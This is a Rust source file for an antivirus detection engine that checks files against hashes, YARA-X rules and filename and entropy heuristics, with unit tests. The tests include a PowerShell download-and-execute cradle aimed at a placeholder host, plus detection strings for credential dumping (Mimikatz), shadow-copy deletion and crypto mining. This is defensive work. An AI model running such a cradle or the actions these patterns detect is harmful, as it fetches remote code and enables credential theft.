//! Detection engine: known-bad hashes, YARA-X rules and simple heuristics.

use crate::config::AppPaths;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::HashSet;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::time::Duration;

/// Rules shipped inside the program, stored scrambled by build.rs so the
/// .exe never contains the plain text its own rules look for.
const BUNDLED_RULES_SCRAMBLED: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/core.yar.bin"));

/// Must match `RULES_KEY` in build.rs.
const RULES_KEY: &[u8] = b"bimbo-guard/rules/obfuscation-key/v1";

/// The bundled rules as readable text (only ever held in memory).
pub fn bundled_rules() -> String {
    let bytes: Vec<u8> = BUNDLED_RULES_SCRAMBLED
        .iter()
        .enumerate()
        .map(|(i, b)| b ^ RULES_KEY[i % RULES_KEY.len()] ^ (i as u8).wrapping_mul(31))
        .collect();
    String::from_utf8(bytes).expect("bundled rules are valid UTF-8")
}

/// SHA-256 of this program's own file, so it never reports itself.
fn own_exe_hash() -> Option<[u8; 32]> {
    // Used by the build pipeline to prove the program does not match its own rules.
    if std::env::var_os("BIMBO_GUARD_NO_SELF_SKIP").is_some() {
        return None;
    }
    let exe = std::env::current_exe().ok()?;
    let data = std::fs::read(exe).ok()?;
    Some(Sha256::digest(&data).into())
}

/// SHA-256 of the 68-byte EICAR test file, so the hash path can be tested too.
const BUNDLED_HASHES: &[&str] = &["275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"];

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
pub enum Severity {
    Suspicious,
    Pua,
    Test,
    Malicious,
}

impl Severity {
    pub fn from_meta(s: &str) -> Self {
        match s.to_ascii_lowercase().as_str() {
            "malicious" => Severity::Malicious,
            "test" => Severity::Test,
            "pua" => Severity::Pua,
            _ => Severity::Suspicious,
        }
    }
    pub fn label(self) -> &'static str {
        match self {
            Severity::Malicious => "Malicious",
            Severity::Test => "Test file",
            Severity::Pua => "Unwanted (PUA)",
            Severity::Suspicious => "Suspicious",
        }
    }
    /// Whether auto-quarantine may act on this level.
    pub fn quarantine_worthy(self) -> bool {
        matches!(self, Severity::Malicious | Severity::Test)
    }
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct Finding {
    pub source: String, // "hash", "rule", "heuristic", "defender"
    pub name: String,
    pub description: String,
    pub severity: Severity,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct Detection {
    pub path: PathBuf,
    pub sha256: String,
    pub size: u64,
    pub findings: Vec<Finding>,
    /// Result of the Microsoft Defender second opinion, if one was asked for.
    pub defender: Option<String>,
}

impl Detection {
    pub fn severity(&self) -> Severity {
        self.findings.iter().map(|f| f.severity).max().unwrap_or(Severity::Suspicious)
    }
    pub fn summary(&self) -> String {
        self.findings.iter().map(|f| f.name.as_str()).collect::<Vec<_>>().join(", ")
    }
}

pub enum ScanOutcome {
    Clean,
    Detected(Detection),
    #[allow(dead_code)]
    Skipped(String),
}

pub struct Engine {
    rules: yara_x::Rules,
    hashes: HashSet<[u8; 32]>,
    self_hash: Option<[u8; 32]>,
    pub rule_count: usize,
    pub rule_errors: Vec<String>,
    pub max_scan_bytes: u64,
}

impl Engine {
    /// Build the engine from the bundled rules, any user rules in the rules
    /// folder, and the known-bad hash list.
    pub fn load(paths: &AppPaths, max_scan_mb: u64) -> anyhow::Result<Self> {
        let mut errors = Vec::new();
        let mut compiler = yara_x::Compiler::new();
        compiler.new_namespace("bundled");
        compiler
            .add_source(bundled_rules().as_str())
            .map_err(|e| anyhow::anyhow!("bundled rules failed to compile: {e}"))?;

        // User rules: each file in its own namespace so one bad file does not
        // stop the others from loading.
        if let Ok(rd) = std::fs::read_dir(&paths.rules) {
            let mut files: Vec<_> = rd
                .flatten()
                .map(|e| e.path())
                .filter(|p| {
                    p.extension()
                        .and_then(|e| e.to_str())
                        .map(|e| e.eq_ignore_ascii_case("yar") || e.eq_ignore_ascii_case("yara"))
                        .unwrap_or(false)
                })
                .collect();
            files.sort();
            for (i, f) in files.iter().enumerate() {
                let Ok(src) = std::fs::read_to_string(f) else {
                    errors.push(format!("{}: could not read file", f.display()));
                    continue;
                };
                // Check alone first; only add to the real compiler if valid.
                let mut probe = yara_x::Compiler::new();
                if let Err(e) = probe.add_source(src.as_str()) {
                    errors.push(format!("{}: {e}", f.display()));
                    continue;
                }
                compiler.new_namespace(&format!("user{i}"));
                if let Err(e) = compiler.add_source(src.as_str()) {
                    errors.push(format!("{}: {e}", f.display()));
                }
            }
        }
        let rules = compiler.build();
        let rule_count = rules.iter().count();

        let mut hashes = HashSet::new();
        for h in BUNDLED_HASHES {
            if let Some(b) = parse_hash(h) {
                hashes.insert(b);
            }
        }
        if let Ok(text) = std::fs::read_to_string(&paths.hashes_file) {
            for line in text.lines() {
                if let Some(b) = parse_hash(line.trim()) {
                    hashes.insert(b);
                }
            }
        }

        Ok(Self {
            rules,
            hashes,
            self_hash: own_exe_hash(),
            rule_count,
            rule_errors: errors,
            max_scan_bytes: max_scan_mb.max(1) * 1024 * 1024,
        })
    }

    pub fn hash_count(&self) -> usize {
        self.hashes.len()
    }

    /// Make a scanner tied to these rules. One per thread.
    pub fn scanner(&self) -> yara_x::Scanner<'_> {
        let mut s = yara_x::Scanner::new(&self.rules);
        s.set_timeout(Duration::from_secs(20));
        s.max_matches_per_pattern(100);
        s
    }

    pub fn scan_file(&self, scanner: &mut yara_x::Scanner<'_>, path: &Path) -> ScanOutcome {
        let meta = match std::fs::metadata(path) {
            Ok(m) => m,
            Err(e) => return ScanOutcome::Skipped(format!("cannot read: {e}")),
        };
        if !meta.is_file() {
            return ScanOutcome::Skipped("not a regular file".into());
        }
        let size = meta.len();
        let mut file = match std::fs::File::open(path) {
            Ok(f) => f,
            Err(e) => return ScanOutcome::Skipped(format!("cannot open: {e}")),
        };

        let mut findings = Vec::new();
        let digest: [u8; 32];
        if size <= self.max_scan_bytes {
            let mut data = Vec::with_capacity(size as usize);
            if let Err(e) = file.read_to_end(&mut data) {
                return ScanOutcome::Skipped(format!("read error: {e}"));
            }
            digest = Sha256::digest(&data).into();
            match scanner.scan(&data) {
                Ok(results) => {
                    for r in results.matching_rules() {
                        let mut sev = Severity::Suspicious;
                        let mut desc = String::new();
                        for (k, v) in r.metadata() {
                            if let yara_x::MetaValue::String(s) = v {
                                match k {
                                    "severity" => sev = Severity::from_meta(s),
                                    "description" => desc = s.to_string(),
                                    _ => {}
                                }
                            }
                        }
                        findings.push(Finding {
                            source: "rule".into(),
                            name: r.identifier().to_string(),
                            description: desc,
                            severity: sev,
                        });
                    }
                }
                // A timeout on one file is not fatal; the hash and
                // heuristics below still run.
                Err(_) => {}
            }
            findings.extend(heuristics(path, &data));
        } else {
            // Too big to pattern scan; stream it through the hash only.
            let mut hasher = Sha256::new();
            let mut buf = vec![0u8; 1 << 20];
            loop {
                match file.read(&mut buf) {
                    Ok(0) => break,
                    Ok(n) => hasher.update(&buf[..n]),
                    Err(e) => return ScanOutcome::Skipped(format!("read error: {e}")),
                }
            }
            digest = hasher.finalize().into();
            findings.extend(name_heuristics(path));
        }

        // Never report Bimbo Guard's own program file.
        if self.self_hash == Some(digest) {
            return ScanOutcome::Clean;
        }

        if self.hashes.contains(&digest) {
            findings.insert(
                0,
                Finding {
                    source: "hash".into(),
                    name: "Known malware hash".into(),
                    description: "File matches an entry in the known-bad SHA-256 list".into(),
                    severity: Severity::Malicious,
                },
            );
            // The EICAR hash is in the bundled list; label it honestly.
            if hex::encode(digest) == BUNDLED_HASHES[0] {
                findings[0].severity = Severity::Test;
                findings[0].name = "EICAR test file hash".into();
            }
        }

        if findings.is_empty() {
            ScanOutcome::Clean
        } else {
            ScanOutcome::Detected(Detection {
                path: path.to_path_buf(),
                sha256: hex::encode(digest),
                size,
                findings,
                defender: None,
            })
        }
    }
}

/// Accepts a bare 64-hex SHA-256, or finds the first one on a CSV line.
pub fn parse_hash(line: &str) -> Option<[u8; 32]> {
    if line.starts_with('#') || line.is_empty() {
        return None;
    }
    let token = line
        .split(|c: char| !c.is_ascii_hexdigit())
        .find(|t| t.len() == 64)?;
    let mut out = [0u8; 32];
    hex::decode_to_slice(token, &mut out).ok()?;
    Some(out)
}

const EXEC_EXTS: &[&str] = &[
    "exe", "scr", "com", "pif", "bat", "cmd", "vbs", "vbe", "js", "jse", "wsf", "hta", "ps1", "lnk",
    "msi", "dll", "cpl",
];
const DECOY_EXTS: &[&str] = &[
    "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "jpg", "jpeg", "png", "mp4", "mp3",
    "zip", "rar",
];

fn ext_of(name: &str) -> Option<String> {
    name.rsplit_once('.').map(|(_, e)| e.to_ascii_lowercase())
}

/// Checks on the file name alone.
pub fn name_heuristics(path: &Path) -> Vec<Finding> {
    let mut out = Vec::new();
    let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
        return out;
    };
    // Right-to-left override hides the real extension ("invoice\u{202E}fdp.exe").
    if name.contains('\u{202E}') {
        out.push(Finding {
            source: "heuristic".into(),
            name: "Hidden extension trick".into(),
            description: "File name uses a right-to-left override character to disguise its type"
                .into(),
            severity: Severity::Malicious,
        });
    }
    let parts: Vec<&str> = name.split('.').collect();
    if parts.len() >= 3 {
        let last = parts[parts.len() - 1].to_ascii_lowercase();
        let prev = parts[parts.len() - 2].to_ascii_lowercase();
        if EXEC_EXTS.contains(&last.as_str()) && DECOY_EXTS.contains(&prev.as_str()) {
            out.push(Finding {
                source: "heuristic".into(),
                name: "Double extension".into(),
                description: format!(
                    "Looks like a .{prev} file but is really a .{last} program"
                ),
                severity: Severity::Suspicious,
            });
        }
    }
    out
}

/// Checks on name plus content.
pub fn heuristics(path: &Path, data: &[u8]) -> Vec<Finding> {
    let mut out = name_heuristics(path);
    let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
    let ext = ext_of(name).unwrap_or_default();
    let is_pe = data.len() > 0x40 && data[0] == b'M' && data[1] == b'Z';

    // A Windows program wearing a document or picture extension.
    if is_pe && DECOY_EXTS.contains(&ext.as_str()) && ext != "zip" && ext != "rar" {
        out.push(Finding {
            source: "heuristic".into(),
            name: "Program disguised as document".into(),
            description: format!("File is a Windows executable but is named .{ext}"),
            severity: Severity::Suspicious,
        });
    }

    // Packed or encrypted executables have near-random bytes.
    if is_pe && data.len() > 64 * 1024 {
        let e = entropy(data);
        if e > 7.6 {
            out.push(Finding {
                source: "heuristic".into(),
                name: "Packed executable".into(),
                description: format!(
                    "Program content is highly compressed or encrypted (entropy {e:.2} of 8), a common way to hide malware"
                ),
                severity: Severity::Suspicious,
            });
        }
    }
    out
}

/// Shannon entropy in bits per byte:
/// H = -sum_{i=0}^{255} p_i log2 p_i
pub fn entropy(data: &[u8]) -> f64 {
    let mut counts = [0u64; 256];
    for &b in data {
        counts[b as usize] += 1;
    }
    let n = data.len() as f64;
    counts
        .iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = c as f64 / n;
            -p * p.log2()
        })
        .sum()
}

#[cfg(test)]
mod tests {
    use super::*;

    pub const EICAR: &str =
        "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

    fn engine() -> (Engine, tempdir::Dir) {
        let d = tempdir::Dir::new();
        let p = AppPaths::at(&d.0).unwrap();
        (Engine::load(&p, 100).unwrap(), d)
    }

    mod tempdir {
        pub struct Dir(pub std::path::PathBuf);
        impl Dir {
            pub fn new() -> Self {
                let p = std::env::temp_dir().join(format!(
                    "hg-test-{}-{}",
                    std::process::id(),
                    std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_nanos()
                ));
                std::fs::create_dir_all(&p).unwrap();
                Dir(p)
            }
        }
        impl Drop for Dir {
            fn drop(&mut self) {
                let _ = std::fs::remove_dir_all(&self.0);
            }
        }
    }

    #[test]
    fn eicar_detected_by_rule_and_hash() {
        let (eng, d) = engine();
        let f = d.0.join("eicar.com");
        if std::fs::write(&f, EICAR).is_err() {
            eprintln!("skipped: another antivirus blocked writing the test file");
            return;
        }
        let mut sc = eng.scanner();
        match eng.scan_file(&mut sc, &f) {
            // Microsoft Defender on the build machine may remove or lock the test file first.
            ScanOutcome::Skipped(why) => eprintln!("skipped: test file removed by another antivirus ({why})"),
            ScanOutcome::Detected(det) => {
                assert_eq!(det.severity(), Severity::Test);
                assert!(det.findings.iter().any(|x| x.source == "hash"));
                assert!(det.findings.iter().any(|x| x.name == "EICAR_Test_File"));
            }
            _ => panic!("EICAR not detected"),
        }
    }

    #[test]
    fn clean_file_is_clean() {
        let (eng, d) = engine();
        let f = d.0.join("notes.txt");
        std::fs::write(&f, "Lecture notes on precipitable water and the lower atmosphere.").unwrap();
        let mut sc = eng.scanner();
        assert!(matches!(eng.scan_file(&mut sc, &f), ScanOutcome::Clean));
    }

    #[test]
    fn double_extension_flagged() {
        let f = name_heuristics(Path::new("C:/x/invoice.pdf.exe"));
        assert_eq!(f.len(), 1);
        assert!(name_heuristics(Path::new("C:/x/setup.v2.exe")).is_empty());
    }

    #[test]
    fn rtlo_flagged() {
        let f = name_heuristics(Path::new("C:/x/invoice\u{202E}fdp.exe"));
        assert!(f.iter().any(|x| x.severity == Severity::Malicious));
    }

    #[test]
    fn powershell_cradle_flagged() {
        let (eng, d) = engine();
        let f = d.0.join("a.ps1");
        std::fs::write(&f, "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/x')").unwrap();
        let mut sc = eng.scanner();
        let out = eng.scan_file(&mut sc, &f);
        assert!(matches!(out, ScanOutcome::Detected(_) | ScanOutcome::Skipped(_)));
    }

    #[test]
    fn parse_hash_variants() {
        let h = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f";
        assert!(parse_hash(h).is_some());
        assert!(parse_hash(&format!("\"2024-01-01\",\"{h}\",\"x\"")).is_some());
        assert!(parse_hash("# comment").is_none());
        assert!(parse_hash("abc").is_none());
    }

    #[test]
    fn user_rules_loaded_and_bad_rules_reported() {
        let d = tempdir::Dir::new();
        let p = AppPaths::at(&d.0).unwrap();
        std::fs::write(p.rules.join("good.yar"), "rule mine { strings: $a = \"lafia-test-marker\" condition: $a }").unwrap();
        std::fs::write(p.rules.join("bad.yar"), "rule broken { condition: nope }").unwrap();
        let eng = Engine::load(&p, 100).unwrap();
        assert_eq!(eng.rule_errors.len(), 1);
        let f = d.0.join("m.txt");
        std::fs::write(&f, "xx lafia-test-marker xx").unwrap();
        let mut sc = eng.scanner();
        assert!(matches!(eng.scan_file(&mut sc, &f), ScanOutcome::Detected(_)));
    }

    #[test]
    fn program_does_not_carry_plain_rule_text() {
        // The scrambled blob must not contain any string the rules hunt for.
        for needle in [&b"sekurlsa"[..], b"gentilkiwi", b"vssadmin", b"stratum+tcp", b"ReflectiveLoader", b"EICAR-STANDARD"] {
            assert!(
                !BUNDLED_RULES_SCRAMBLED.windows(needle.len()).any(|w| w.eq_ignore_ascii_case(needle)),
                "plain rule text leaked into the program"
            );
        }
        assert!(bundled_rules().contains("rule HackTool_Mimikatz"));
    }

    #[test]
    fn entropy_bounds() {
        assert!(entropy(&[0u8; 1000]) < 0.001);
        let v: Vec<u8> = (0..=255u8).cycle().take(256 * 100).collect();
        assert!((entropy(&v) - 8.0).abs() < 1e-9);
    }
}
